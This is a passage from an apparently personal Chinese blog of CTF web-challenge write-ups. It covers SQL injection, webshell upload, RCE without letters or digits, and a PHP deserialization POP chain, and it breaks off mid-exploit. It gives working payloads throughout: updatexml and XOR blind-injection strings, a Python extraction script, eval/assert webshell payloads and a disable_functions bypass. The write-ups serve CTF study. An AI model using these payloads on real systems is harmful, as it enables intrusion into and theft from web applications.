<h2 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h2><p>菜刀直接连，不过不知道为什么直接执行命令不成功。。。</p>
<h2 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h2><p>sqlmap一把梭</p>
<h2 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h2><p>f12找到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~~~post money and password~~~</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;elseif (<span class="variable">$password</span> == 404) &#123;</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uploader.shimo.im/f/ty7jj9ARcOk6Dymi.png!thumbnail" alt></p>
<h2 id="hardsql"><a href="#hardsql" class="headerlink" title="hardsql"></a>hardsql</h2><p>过滤了* 空格 =<br>可以用updatexml报错注入，like代替等号 用括号括起来就可以无空格<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%27or(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)<span class="built_in">where</span>(table_schema)like(database()))),1))%23&amp;password=123456</span><br></pre></td></tr></table></figure></p>
<p>注出表名H4rDsq1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%27or(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)<span class="built_in">where</span>(table_name)like(<span class="string">'H4rDsq1'</span>))),1))%23&amp;password=123456</span><br></pre></td></tr></table></figure></p>
<p>注出列 id,username,password<br>查password<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%27or(updatexml(1,concat(0x3a,(select(group_concat(password))from(H4rDsq1))),1))%23&amp;password=123456</span><br></pre></td></tr></table></figure></p>
<p>updatexml只能爆出32位，一个是用mid或者substr截取字符串，还有一个是用reverse输出，这里过滤了mid和substr</p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>没有过滤phtml,直接上传shell<br><img src="https://uploader.shimo.im/f/NkpqSxxoC4wSEt39.png!thumbnail" alt></p>
<h2 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'code'</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">'code'</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;40)&#123;</span><br><span class="line">                                        die(<span class="string">"This is too Long."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        die(<span class="string">"NO."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="built_in">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为之前看过p神的文章，附链接<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a>和<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a><br>这里利用php7的新特性解题<br><img src="https://www.leavesongs.com/media/attachment/2018/10/06/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af.png" alt><br>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个<br>括号中可以是任意PHP表达式。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">"phpinfo"</span>;</span><br><span class="line"><span class="built_in">echo</span> urlencode(~<span class="variable">$a</span>);</span><br><span class="line">%8F%97%8F%96%91%99%90 //phpinfo</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uploader.shimo.im/f/oXEPeYX0fW0si58l.png!thumbnail" alt><br>phpinfo成功，看一下disable_functions，执行命令的函数基本都禁了，这里使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">'./'</span>));</span><br><span class="line"></span><br><span class="line">%8F%8D%96%91%8B%A0%8D <span class="comment"># print_r</span></span><br><span class="line">%8C%9C%9E%91%9B%96%8D <span class="comment"># scandir</span></span><br><span class="line">读当前目录</span><br><span class="line">(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((<span class="string">"./"</span>)));</span><br></pre></td></tr></table></figure></p>
<p>就一个index.php,读一下根目录，找到了flag和readflag，先读一下flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readfile(<span class="string">'/flag'</span>);</span><br><span class="line"></span><br><span class="line">%8D%9A%9E%9B%99%96%93%9A <span class="comment"># readfile</span></span><br><span class="line">%D0%99%93%9E%98 <span class="comment"># /flag</span></span><br><span class="line"></span><br><span class="line">(~%8D%9A%9E%9B%99%96%93%9A)((~%D0%99%93%9E%98));</span><br></pre></td></tr></table></figure></p>
<p>读flag读不出来内容，这里要执行一下readflag<br>写一个shell，assert没被禁<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="variable">$_POST</span>[<span class="string">'a'</span>]);</span><br><span class="line">%9E%8C%8C%9A%8D%8B <span class="comment"># assert</span></span><br><span class="line">%DB%A0%AF%B0%AC%AB <span class="comment"># $_POST</span></span><br><span class="line">%9E <span class="comment"># a</span></span><br><span class="line">(~%9E%8C%8C%9A%8D%8B)((~%DB%A0%AF%B0%AC%AB)[(~%9E)]);</span><br></pre></td></tr></table></figure></p>
<p>结果500，23333<br>当时比赛的时候tmp目录下有个是有东西的，有小马，复现的时候tmp是空的<br>还有一种payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;<span class="variable">$&#123;$_&#125;</span>[_](<span class="variable">$&#123;$_&#125;</span>[__]);&amp;_=assert&amp;__=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'a'</span>])</span><br><span class="line"><span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span> 异或结果是_GET</span><br><span class="line">也可以取反 %A0%B8%BA%AB</span><br><span class="line">?code=<span class="variable">$_</span>=(~%A0%B8%BA%AB);<span class="variable">$&#123;$_&#125;</span>[_](<span class="variable">$&#123;$_&#125;</span>[__]);&amp;_=assert&amp;__=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'a'</span>])</span><br></pre></td></tr></table></figure></p>
<p>php7.0可用，7.2就不行了，直接连上蚁剑，上传bypass文件<br>git地址 <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>用法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">pwd</span>&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure></p>
<p>因为/var/www/html不可上传文件，所以上传到tmp目录下的shell bypass_disablefunc.php要包含一下<br><img src="https://uploader.shimo.im/f/rPUz71f8PhMugGAB.png!thumbnail" alt></p>
<h2 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h2><p>这道题我先在登陆框试了一下，过滤了单引号和注释符，试了下用转义符转义掉username后的单引号,用;%00注释password的单引号<br>失败了，后台句子可能有括号，括号又被过滤了，只能从参数id处尝试注入了，过滤了空格 *，注释符，mid,试了下之前看glzjin师傅讲的异或注入<br>1^1^1和1^0^1,试了下发现存在注入<br>脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">list = <span class="string">"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm_0123456789.,&#123;&#125;"</span></span><br><span class="line">i=1</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,9):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list:</span><br><span class="line">        url = <span class="string">"http://856f1e16-f40d-4ca5-9515-41b9db61fbeb.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;)^1"</span></span><br><span class="line">        <span class="comment">#表名 F1naI1y</span></span><br><span class="line">        <span class="comment">#url="http://856f1e16-f40d-4ca5-9515-41b9db61fbeb.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),&#123;&#125;,1))=&#123;&#125;)^1"</span></span><br><span class="line">        <span class="comment">#表名 id,username,password</span></span><br><span class="line">        <span class="comment">#url="http://856f1e16-f40d-4ca5-9515-41b9db61fbeb.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))=&#123;&#125;)^1"</span></span><br><span class="line">        url=url.format(i,ord(j))</span><br><span class="line">        p=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"NO! Not this! Click others~~~"</span> <span class="keyword">in</span> p.text):</span><br><span class="line">                    flag=flag+j</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p>
<p>之前试过其他脚本跑buu会429，这个没有。。<br>最后读flag的时候正着读读到后面直接没有数据了2333<br>多谢ch4ser提醒reserve读一下</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/17/swpu刷题记录2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cop">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cop's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/17/swpu刷题记录2/" itemprop="url">swpu刷题记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-17T10:21:59+08:00">
                2020-01-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>admin 123456登陆一下，弹出来一个sql语句<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=<span class="string">''</span> and passwd=<span class="string">''</span></span><br></pre></td></tr></table></figure></p>
<p>简单测试过滤了select sleep，测试万能密码提示密码错误，猜测后台有个判断sql查出来passwd是否等于post passwd<br>实验吧有道原题叫因缺思汀的绕过<br>payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin<span class="string">' or 1 group by passwd with rollup having passwd is NULL#&amp;passwd=</span></span><br></pre></td></tr></table></figure></p>
<p>wsdl.php可以看到有很多method，有用的应该只有File_read，hint，Get_flag<br>hint给出index.php Service.php interface.php se.php<br>File_read有个值keyaaaaaaaasdfsaf.txt，给出flag{this_is_false_flag}<br>get_flag 给出method can useget_flagonly admin in 127.0.0.1 can get_flag<br>猜测是ssrf+越权，下面开始读文件<br>index.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ob_start(); </span><br><span class="line">include (<span class="string">"encode.php"</span>); </span><br><span class="line">include(<span class="string">"Service.php"</span>); </span><br><span class="line">//error_reporting(0); </span><br><span class="line">//phpinfo(); </span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_GET</span>[<span class="string">'method'</span>]?<span class="variable">$_GET</span>[<span class="string">'method'</span>]:<span class="string">'index'</span>; </span><br><span class="line">//<span class="built_in">echo</span> 1231; </span><br><span class="line"><span class="variable">$allow_method</span> = array(<span class="string">"File_read"</span>,<span class="string">"login"</span>,<span class="string">"index"</span>,<span class="string">"hint"</span>,<span class="string">"user"</span>,<span class="string">"get_flag"</span>); </span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$method</span>,<span class="variable">$allow_method</span>)) </span><br><span class="line">&#123; </span><br><span class="line">    die(<span class="string">"not allow method"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$method</span>===<span class="string">"File_read"</span>) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$param</span> =<span class="variable">$_POST</span>[<span class="string">'filename'</span>]; </span><br><span class="line">    <span class="variable">$param2</span>=null; </span><br><span class="line">&#125;<span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$method</span>===<span class="string">"login"</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$param</span>=<span class="variable">$_POST</span>[<span class="string">'username'</span>]; </span><br><span class="line">        <span class="variable">$param2</span> = <span class="variable">$_POST</span>[<span class="string">'passwd'</span>]; </span><br><span class="line">    &#125;<span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"method can use"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$method</span>; </span><br><span class="line"><span class="variable">$newclass</span> = new Service(); </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$newclass</span>-&gt;<span class="variable">$method</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>); </span><br><span class="line">ob_flush();</span><br></pre></td></tr></table></figure></p>
<p>encode.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> en_crypt(<span class="variable">$content</span>,<span class="variable">$key</span>)&#123; </span><br><span class="line">    <span class="variable">$key</span>    =    md5(<span class="variable">$key</span>); </span><br><span class="line">    <span class="variable">$h</span>      =    0; </span><br><span class="line">    <span class="variable">$length</span>    =    strlen(<span class="variable">$content</span>); </span><br><span class="line">    <span class="variable">$swpuctf</span>      =    strlen(<span class="variable">$key</span>); </span><br><span class="line">    <span class="variable">$varch</span>   =    <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = 0; <span class="variable">$j</span> &lt; <span class="variable">$length</span>; <span class="variable">$j</span>++) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$h</span> == <span class="variable">$swpuctf</span>) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="variable">$h</span> = 0; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="variable">$varch</span> .= <span class="variable">$key</span>&#123;<span class="variable">$h</span>&#125;; </span><br><span class="line">         </span><br><span class="line">        <span class="variable">$h</span>++; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$swpu</span>  =  <span class="string">''</span>; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = 0; <span class="variable">$j</span> &lt; <span class="variable">$length</span>; <span class="variable">$j</span>++) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$swpu</span> .= chr(ord(<span class="variable">$content</span>&#123;<span class="variable">$j</span>&#125;) + (ord(<span class="variable">$varch</span>&#123;<span class="variable">$j</span>&#125;)) % 256); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">return</span> base64_encode(<span class="variable">$swpu</span>);</span><br></pre></td></tr></table></figure></p>
<p>se.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>); </span><br><span class="line">class aa </span><br><span class="line">&#123; </span><br><span class="line">        public <span class="variable">$mod1</span>; </span><br><span class="line">        public <span class="variable">$mod2</span>; </span><br><span class="line">        public <span class="keyword">function</span> __call(<span class="variable">$name</span>,<span class="variable">$param</span>) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;) </span><br><span class="line">                &#123; </span><br><span class="line">                    <span class="variable">$s1</span> = <span class="variable">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;; </span><br><span class="line">                    <span class="variable">$s1</span>(); </span><br><span class="line">                &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        public <span class="keyword">function</span> __get(<span class="variable">$ke</span>) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$this</span>-&gt;mod2[<span class="variable">$ke</span>]; </span><br><span class="line">        &#125; </span><br><span class="line">&#125; </span><br><span class="line">class bb </span><br><span class="line">&#123; </span><br><span class="line">        public <span class="variable">$mod1</span>; </span><br><span class="line">        public <span class="variable">$mod2</span>; </span><br><span class="line">        public <span class="keyword">function</span> __destruct() </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="variable">$this</span>-&gt;mod1-&gt;test2(); </span><br><span class="line">        &#125; </span><br><span class="line">&#125;  </span><br><span class="line">class cc </span><br><span class="line">&#123; </span><br><span class="line">        public <span class="variable">$mod1</span>; </span><br><span class="line">        public <span class="variable">$mod2</span>; </span><br><span class="line">        public <span class="variable">$mod3</span>; </span><br><span class="line">        public <span class="keyword">function</span> __invoke() </span><br><span class="line">        &#123; </span><br><span class="line">                <span class="variable">$this</span>-&gt;mod2 = <span class="variable">$this</span>-&gt;mod3.<span class="variable">$this</span>-&gt;mod1; </span><br><span class="line">        &#125;  </span><br><span class="line">&#125; </span><br><span class="line">class dd </span><br><span class="line">&#123; </span><br><span class="line">        public <span class="variable">$name</span>; </span><br><span class="line">        public <span class="variable">$flag</span>; </span><br><span class="line">        public <span class="variable">$b</span>; </span><br><span class="line">         </span><br><span class="line">        public <span class="keyword">function</span> getflag() </span><br><span class="line">        &#123; </span><br><span class="line">                session_start();  </span><br><span class="line">                var_dump(<span class="variable">$_SESSION</span>); </span><br><span class="line">                <span class="variable">$a</span> = array(reset(<span class="variable">$_SESSION</span>),<span class="variable">$this</span>-&gt;flag); </span><br><span class="line">                <span class="built_in">echo</span> call_user_func(<span class="variable">$this</span>-&gt;b,<span class="variable">$a</span>); </span><br><span class="line">        &#125; </span><br><span class="line">&#125; </span><br><span class="line">class ee </span><br><span class="line">&#123; </span><br><span class="line">        public <span class="variable">$str1</span>; </span><br><span class="line">        public <span class="variable">$str2</span>; </span><br><span class="line">        public <span class="keyword">function</span> __toString() </span><br><span class="line">        &#123; </span><br><span class="line">                <span class="variable">$this</span>-&gt;str1-&gt;&#123;<span class="variable">$this</span>-&gt;str2&#125;(); </span><br><span class="line">                <span class="built_in">return</span> <span class="string">"1"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">'aa'</span>]; </span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></p>
<p>根据encode写出decode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> de_crypt(<span class="variable">$swpu</span>,<span class="variable">$key</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$swpu</span>=base64_decode(<span class="variable">$swpu</span>);</span><br><span class="line">    <span class="variable">$h</span>      =    0;</span><br><span class="line">    <span class="variable">$length</span>    =    strlen(<span class="variable">$swpu</span>);</span><br><span class="line">    <span class="variable">$swpuctf</span>      =    strlen(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$varch</span>   =    <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = 0; <span class="variable">$j</span> &lt; <span class="variable">$length</span>; <span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$h</span> == <span class="variable">$swpuctf</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$h</span> = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$varch</span> .= <span class="variable">$key</span>&#123;<span class="variable">$h</span>&#125;;  </span><br><span class="line">        <span class="variable">$h</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span>  =  <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=0;<span class="variable">$j</span>&lt;<span class="variable">$length</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ord(<span class="variable">$swpu</span>&#123;<span class="variable">$j</span>&#125;)&gt;ord(<span class="variable">$varch</span>&#123;<span class="variable">$j</span>&#125;))</span><br><span class="line">            <span class="variable">$content</span>&#123;<span class="variable">$j</span>&#125;=chr(ord(<span class="variable">$swpu</span>&#123;<span class="variable">$j</span>&#125;)-ord(<span class="variable">$varch</span>&#123;<span class="variable">$j</span>&#125;) );</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ord(<span class="variable">$swpu</span>&#123;<span class="variable">$j</span>&#125;)&lt;ord(<span class="variable">$varch</span>&#123;<span class="variable">$j</span>&#125;))</span><br><span class="line">            <span class="variable">$content</span>&#123;<span class="variable">$j</span>&#125;=chr(ord(<span class="variable">$swpu</span>&#123;<span class="variable">$j</span>&#125;)+256-ord(<span class="variable">$varch</span>&#123;<span class="variable">$j</span>&#125;) );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$content</span></span><br><span class="line">&#125;</span><br><span class="line">de_crypt(<span class="string">"3J6Roahxag=="</span>, <span class="string">"flag&#123;this_is_false_flag&#125;"</span>);</span><br></pre></td></tr></table></figure></p>
<p>解密得到xiaoC:2，改成admin:1重新加密xZmdm9NxaQ==<br>接下来就是构造pop链<br>从bb::destruct开始，触发aa::call<br>call又触发get，然后触发cc::invoke<br>invoke中的.字符串拼接触发ee::toString<br>toString中可以构造函数触发dd:getflag<br>exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">class aa</span><br><span class="line">&#123;</span><br><span class="line">    public <span 